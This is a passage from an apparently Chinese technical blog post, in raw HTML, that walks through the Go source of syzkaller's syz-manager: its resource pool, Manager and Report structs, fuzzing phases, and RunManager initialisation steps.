class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Put(ids ...<span class="hljs-type">int</span>) &#123;<br>pool.mu.Lock()<br><span class="hljs-keyword">defer</span> pool.mu.Unlock()<br>pool.ids = <span class="hljs-built_in">append</span>(pool.ids, ids...)<br><span class="hljs-comment">// Notify the listener.</span><br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> pool.Freed &lt;- <span class="hljs-literal">true</span>:<br><span class="hljs-keyword">default</span>:<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Len() <span class="hljs-type">int</span> &#123;<br>pool.mu.RLock()<br><span class="hljs-keyword">defer</span> pool.mu.RUnlock()<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">len</span>(pool.ids)<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Take(cnt <span class="hljs-type">int</span>) []<span class="hljs-type">int</span> &#123;<br>pool.mu.Lock()<br><span class="hljs-keyword">defer</span> pool.mu.Unlock()<br>totalItems := <span class="hljs-built_in">len</span>(pool.ids)<br><span class="hljs-keyword">if</span> totalItems &lt; cnt &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br>ret := <span class="hljs-built_in">append</span>([]<span class="hljs-type">int</span>&#123;&#125;, pool.ids[totalItems-cnt:]...)<br>pool.ids = pool.ids[:totalItems-cnt]<br><span class="hljs-keyword">return</span> ret<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> TakeOne() *<span class="hljs-type">int</span> &#123;<br>ret := pool.Take(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> ret == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span> &amp;ret[<span class="hljs-number">0</span>]<br>&#125;<br></code></pre></td></tr></table></figure><p>同时有一个 <code>SequentialResourcePool()</code> 函数用以初始化资源池：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">SequentialResourcePool</span><span class="hljs-params">(count <span class="hljs-type">int</span>, delay time.Duration)</span></span> *ResourcePool &#123;<br>ret := &amp;ResourcePool&#123;Freed: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">interface</span>&#123;&#125;, <span class="hljs-number">1</span>)&#125;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; count; i++ &#123;<br>ret.Put(i)<br>time.Sleep(delay)<br>&#125;<br>&#125;()<br><span class="hljs-keyword">return</span> ret<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="全局管控相关">全局管控相关</h2><h3 id="1-Manager：基本信息">1. Manager：基本信息</h3><p><code>Manager</code> 结构体用于<strong>表示一个 syz-manager 的基本信息</strong>，定义于 <code>syz-manager/manager.go</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Manager <span class="hljs-keyword">struct</span> &#123;<br>cfg            *mgrconfig.Config<br>vmPool         *vm.Pool<br>target         *prog.Target<br>sysTarget      *targets.Target<br>reporter       *report.Reporter<br>crashdir       <span class="hljs-type">string</span><br>serv           *RPCServer<br>corpusDB       *db.DB<br>startTime      time.Time<br>firstConnect   time.Time<br>fuzzingTime    time.Duration<br>stats          *Stats<br>crashTypes     <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>vmStop         <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br>checkResult    *rpctype.CheckArgs<br>fresh          <span class="hljs-type">bool</span><br>numFuzzing     <span class="hljs-type">uint32</span><br>numReproducing <span class="hljs-type">uint32</span><br><br>dash *dashapi.Dashboard<br><br>mu                    sync.Mutex<br>phase                 <span class="hljs-type">int</span><br>targetEnabledSyscalls <span class="hljs-keyword">map</span>[*prog.Syscall]<span class="hljs-type">bool</span><br><br>candidates       []rpctype.Candidate <span class="hljs-comment">// untriaged inputs from corpus and hub</span><br>disabledHashes   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>&#123;&#125;<br>corpus           <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]CorpusItem<br>seeds            [][]<span class="hljs-type">byte</span><br>newRepros        [][]<span class="hljs-type">byte</span><br>lastMinCorpus    <span class="hljs-type">int</span><br>memoryLeakFrames <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>dataRaceFrames   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br>saturatedCalls   <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br><br>needMoreRepros <span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span><br>hubReproQueue  <span class="hljs-keyword">chan</span> *Crash<br>reproRequest   <span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span><br><br><span class="hljs-comment">// For checking that files that we are using are not changing under us.</span><br><span class="hljs-comment">// Maps file name to modification time.</span><br>usedFiles <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]time.Time<br><br>modules            []host.KernelModule<br>coverFilter        <span class="hljs-keyword">map</span>[<span class="hljs-type">uint32</span>]<span class="hljs-type">uint32</span><br>coverFilterBitmap  []<span class="hljs-type">byte</span><br>modulesInitialized <span class="hljs-type">bool</span><br><br>assetStorage *asset.Storage<br>&#125;<br></code></pre></td></tr></table></figure><p>这里只说明比较关键的几个字段：</p><ul><li><code>cfg</code>：基本设置信息，对应存放在一个 json 文件中</li><li><code>vmPool</code> ：所用的 VM Pool</li><li><code>reporter</code>：用以报告 crash</li><li><code>serv</code> ：RPC Server，用以与 Guest 间通信</li><li><code>corpusDB</code>：存放语料的数据库</li><li><code>targetEnabledSyscalls</code>：测试用例所允许使用的系统调用</li><li><code>candidates</code>：待执行测试用例</li><li><code>corpus</code>：语料库</li><li><code>seeds</code>：用来对语料库变异的种子</li></ul><h3 id="2-fuzzing-phase">2. fuzzing phase</h3><p><code>syz-manager</code> 中将 fuzzing 流程分为如下的不同阶段：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> (<br><span class="hljs-comment">// 刚刚开始，啥都没做.</span><br>phaseInit = <span class="hljs-literal">iota</span><br><span class="hljs-comment">// 加载了语料库且检查了机器.</span><br>phaseLoadedCorpus<br><span class="hljs-comment">// 从语料库中分类了所有输入.</span><br><span class="hljs-comment">// 这是我们开始查询 hub 与最小化连续语料库的时候.</span><br>phaseTriagedCorpus<br><span class="hljs-comment">// 第一个请求发送到了 hub.</span><br>phaseQueriedHub<br><span class="hljs-comment">// 分类所有来自 hub 的新输入.</span><br><span class="hljs-comment">// 这是我们开始复现 crashes 的时候.</span><br>phaseTriagedHub<br>)<br></code></pre></td></tr></table></figure><h2 id="Fuzzing-结果相关">Fuzzing 结果相关</h2><h3 id="1-Crash：记录-crash-信息">1. Crash：记录 crash 信息</h3><p><code>manager.go</code> 中定义了<code>Crash</code> 结构体用以记录产生 crash 的 VM、机器信息等，<strong>真正的 crash 信息主要存放在一个 <code>Report</code> 结构体中</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Crash <span class="hljs-keyword">struct</span> &#123;<br>vmIndex <span class="hljs-type">int</span><br>hub     <span class="hljs-type">bool</span> <span class="hljs-comment">// this crash was created based on a repro from hub</span><br>*report.Report<br>machineInfo []<span class="hljs-type">byte</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-Report：单次执行结果报告">2. Report：单次执行结果报告</h3><p><code>pkg/report/rteport.go</code> 中的 <code>Report</code> 结构体用以表示单次执行的结果，包括是否产生了 crash、Oops 的信息等等：</p><ul><li><p><code>Title</code>：<strong>Oops 的第一行文本，用来标识特定类型的 crash</strong></p><blockquote><p>例如 <code>BUG: unable to handle page fault for address: ffffffff81001619</code> 这样的</p></blockquote></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Report <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// Title contains a representative description of the first oops.</span><br>Title <span class="hljs-type">string</span><br><span class="hljs-comment">// Alternative titles, used for better deduplication.</span><br><span class="hljs-comment">// If two crashes have a non-empty intersection of Title/AltTitles, they are considered the same bug.</span><br>AltTitles []<span class="hljs-type">string</span><br><span class="hljs-comment">// Bug type (e.g. hang, memory leak, etc).</span><br>Type Type<br><span class="hljs-comment">// The indicative function name.</span><br>Frame <span class="hljs-type">string</span><br><span class="hljs-comment">// Report contains whole oops text.</span><br>Report []<span class="hljs-type">byte</span><br><span class="hljs-comment">// Output contains whole raw console output as passed to Reporter.Parse.</span><br>Output []<span class="hljs-type">byte</span><br><span class="hljs-comment">// StartPos/EndPos denote region of output with oops message(s).</span><br>StartPos <span class="hljs-type">int</span><br>EndPos   <span class="hljs-type">int</span><br><span class="hljs-comment">// SkipPos is position in output where parsing for the next report should start.</span><br>SkipPos <span class="hljs-type">int</span><br><span class="hljs-comment">// Suppressed indicates whether the report should not be reported to user.</span><br>Suppressed <span class="hljs-type">bool</span><br><span class="hljs-comment">// Corrupted indicates whether the report is truncated of corrupted in some other way.</span><br>Corrupted <span class="hljs-type">bool</span><br><span class="hljs-comment">// CorruptedReason contains reason why the report is marked as corrupted.</span><br>CorruptedReason <span class="hljs-type">string</span><br><span class="hljs-comment">// Recipients is a list of RecipientInfo with Email, Display Name, and type.</span><br>Recipients vcs.Recipients<br><span class="hljs-comment">// GuiltyFile is the source file that we think is to blame for the crash  (filled in by Symbolize).</span><br>GuiltyFile <span class="hljs-type">string</span><br><span class="hljs-comment">// reportPrefixLen is length of additional prefix lines that we added before actual crash report.</span><br>reportPrefixLen <span class="hljs-type">int</span><br><span class="hljs-comment">// symbolized is set if the report is symbolized.</span><br>symbolized <span class="hljs-type">bool</span><br>&#125;<br></code></pre></td></tr></table></figure><h1>0x02. main()：加载配置文件，启动 manager</h1><p><code>syz-manager</code> 的 <code>main()</code> 函数其实比较简单，主要就是载入配置文件信息并调用 <code>RunManager()</code> ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> prog.GitRevision == <span class="hljs-string">&quot;&quot;</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;bad syz-manager build: build with make, run bin/syz-manager&quot;</span>)<br>&#125;<br>flag.Parse()<br>log.EnableLogCaching(<span class="hljs-number">1000</span>, <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">20</span>)<br>cfg, err := mgrconfig.LoadFile(*flagConfig)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br>RunManager(cfg)<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><s>👴寻思好像没什么好说的</s></p></blockquote><h1>0x03. RunManager()：进行初始化工作</h1><h3 id="Step-1-初始化-VM-Pool">Step 1. 初始化 VM Pool</h3><p>首先是初始化 VM Pool，这里调用了 <code>vm/vm.go</code> 中的 <code>Create()</code> 来完成 VM pool 的创建</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> vmPool *vm.Pool<br>   <span class="hljs-comment">// &quot;none&quot; 类型对于调试/开发而言是一种特殊情况，manager 并不会启动任何 VM，</span><br>   <span class="hljs-comment">// 但相应的是你应当手动启动 VM 并在此启动 syz-fuzzer.</span><br><span class="hljs-keyword">if</span> cfg.Type != <span class="hljs-string">&quot;none&quot;</span> &#123;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>vmPool, err = vm.Create(cfg, *flagDebug)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>该函数主要就是获取 VM 类型、封装一个 Env 结构体、调用对应类型 VM Pool 的构造函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Create 创建一个可用于创建独立 VMs 的 VM pool.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Create</span><span class="hljs-params">(cfg *mgrconfig.Config, debug <span class="hljs-type">bool</span>)</span></span> (*Pool, <span class="hljs-type">error</span>) &#123;<br>typ, ok := vmimpl.Types[cfg.Type]<br><span class="hljs-keyword">if</span> !ok &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;unknown instance type &#x27;%v&#x27;&quot;</span>, cfg.Type)<br>&#125;<br>env := &amp;vmimpl.Env&#123;<br>Name:      cfg.Name,<br>OS:        cfg.TargetOS,<br>Arch:      cfg.TargetVMArch,<br>Workdir:   cfg.Workdir,<br>Image:     cfg.Image,<br>SSHKey:    cfg.SSHKey,<br>SSHUser:   cfg.SSHUser,<br>Timeouts:  cfg.Timeouts,<br>Debug:     debug,<br>Config:    cfg.VM,<br>KernelSrc: cfg.KernelSrc,<br>&#125;<br>impl, err := typ.Ctor(env)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">return</span> &amp;Pool&#123;<br>impl:     impl,<br>workdir:  env.Workdir,<br>template: cfg.WorkdirTemplate,<br>timeouts: cfg.Timeouts,<br>&#125;, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-2-初始化-Manager，载入语料库，建立通信服务器">Step 2. 初始化 Manager，载入语料库，建立通信服务器</h3><p>随后会创建用于存储 crash 的文件夹与一个新的 Reporter 实例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">crashdir := filepath.Join(cfg.Workdir, <span class="hljs-string">&quot;crashes&quot;</span>)<br>osutil.MkdirAll(crashdir)<br><br>reporter, err := report.NewReporter(cfg)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;%v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来创建一个基本的 Manager 实例，然后是四步走：</p><ul><li><p><code>preloadCorpus()</code>：检查 <code>corpus.db</code> 文件是否存在（若不存在则创建）并载入 <code>sys/要fuzz的OS/test</code> 目录下的测试用模板</p><blockquote><p>语料库载入的模板本身类似于 syzlang 文件，例如 <code>sys/linux/pipe</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">pipe2(&amp;(0x7f0000000000)=&#123;&lt;r0=&gt;0x0, &lt;r1=&gt;0x0&#125;, 0x0)<br>close(r0)<br>close(r1)<br></code></pre></td></tr></table></figure></blockquote></li><li><p><code>initStats()</code>：注册一个 prometheus 监视器（一个开源的监视&amp;预警工具包）</p></li><li><p><code>initHTTP()</code>：创建一个 HTTP 服务器并注册一系列的目录（用以供使用者访问）</p></li><li><p><code>collectUsedFiles()</code>：检查所需文件是否存在</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go">mgr := &amp;Manager&#123;<br>cfg:              cfg,<br>vmPool:           vmPool,<br>target:           cfg.Target,<br>sysTarget:        cfg.SysTarget,<br>reporter:         reporter,<br>crashdir:         crashdir,<br>startTime:        time.Now(),<br>stats:            &amp;Stats&#123;haveHub: cfg.HubClient != <span class="hljs-string">&quot;&quot;</span>&#125;,<br>crashTypes:       <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>corpus:           <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]CorpusItem),<br>disabledHashes:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">struct</span>&#123;&#125;),<br>memoryLeakFrames: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>dataRaceFrames:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>fresh:            <span class="hljs-literal">true</span>,<br>vmStop:           <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>),<br>hubReproQueue:    <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *Crash, <span class="hljs-number">10</span>),<br>needMoreRepros:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>),<br>reproRequest:     <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>usedFiles:        <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]time.Time),<br>saturatedCalls:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>),<br>&#125;<br><br>mgr.preloadCorpus()<br>mgr.initStats() <span class="hljs-comment">// 初始化 prometheus 变量.</span><br>mgr.initHTTP()  <span class="hljs-comment">// 创建 HTTP 服务.</span><br>mgr.collectUsedFiles()<br></code></pre></td></tr></table></figure><p>之后创建一个 RPC Server，用以在 Host 与 Guest VMs 之间进行通信：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Create 为 fuzzer 创建 PRC 服务器.</span><br>mgr.serv, err = startRPCServer(mgr)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create rpc server: %v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-3-初始化-dashboard-相关"><em>Step 3.  初始化 dashboard 相关</em></h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> cfg.DashboardAddr != <span class="hljs-string">&quot;&quot;</span> &#123;<br>mgr.dash, err = dashapi.New(cfg.DashboardClient, cfg.DashboardAddr, cfg.DashboardKey)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to create dashapi connection: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> !cfg.AssetStorage.IsEmpty() &#123;<br>mgr.assetStorage, err = asset.StorageFromConfig(cfg.AssetStorage, mgr.dash)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to init asset storage: %v&quot;</span>, err)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-4-创建【日志输出】协程">Step 4. 创建【日志输出】协程</h3><p>接下来会新起一个协程进行数据记录的工作，内部其实就是一个<strong>每 10s 进行一次进度采集并输出日志的无限循环</strong>，主要是采集执行信息、语料覆盖率、crashes 信息等：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> lastTime := time.Now(); ; &#123;<br>time.Sleep(<span class="hljs-number">10</span> * time.Second)<br>now := time.Now()<br>diff := now.Sub(lastTime)<br>lastTime = now<br>mgr.mu.Lock()<br><span class="hljs-keyword">if</span> mgr.firstConnect.IsZero() &#123;<br>mgr.mu.Unlock()<br><span class="hljs-keyword">continue</span><br>&#125;<br>mgr.fuzzingTime += diff * time.Duration(atomic.LoadUint32(&amp;mgr.numFuzzing))<br>executed := mgr.stats.execTotal.get()<br>crashes := mgr.stats.crashes.get()<br>corpusCover := mgr.stats.corpusCover.get()<br>corpusSignal := mgr.stats.corpusSignal.get()<br>maxSignal := mgr.stats.maxSignal.get()<br>mgr.mu.Unlock()<br>numReproducing := atomic.LoadUint32(&amp;mgr.numReproducing)<br>numFuzzing := atomic.LoadUint32(&amp;mgr.numFuzzing)<br><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;VMs %v, executed %v, cover %v, signal %v/%v, crashes %v, repro %v&quot;</span>,<br>numFuzzing, executed, corpusCover, corpusSignal, maxSignal, crashes, numReproducing)<br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><h3 id="Step-5-创建-bench-协程（每隔一分钟最小化语料库并将-bench-data-写入-bench-文件）">Step 5. 创建 bench 协程（每隔一分钟最小化语料库并将 bench data 写入 bench 文件）</h3><p>这里会判断命令行传入参数是否有 <code>bench=</code>，若是则调用 <code>initBench()</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> *flagBench != <span class="hljs-string">&quot;&quot;</span> &#123;<br>mgr.initBench()<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的 <code>flagBench</code> 是一个全局的 flag 变量，golang 提供了一个 <code>flag</code> 包用以处理命令行参数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>flagConfig = flag.String(<span class="hljs-string">&quot;config&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;configuration file&quot;</span>)<br>flagDebug  = flag.Bool(<span class="hljs-string">&quot;debug&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;dump all VM output to console&quot;</span>)<br>flagBench  = flag.String(<span class="hljs-string">&quot;bench&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;write execution statistics into this file periodically&quot;</span>)<br>)<br></code></pre></td></tr></table></figure><p><code>initBench()</code> 会启动一个协程，主要就是一个每隔一分钟运行一次的循环：</p><ul><li>调用 <code>minimizeCorpus()</code> 将语料库进行最小化</li><li>向 <code>bench</code> 参数指定的文件当中写入 <code>语料库长度、启动时间、fuzzing 时间\n</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 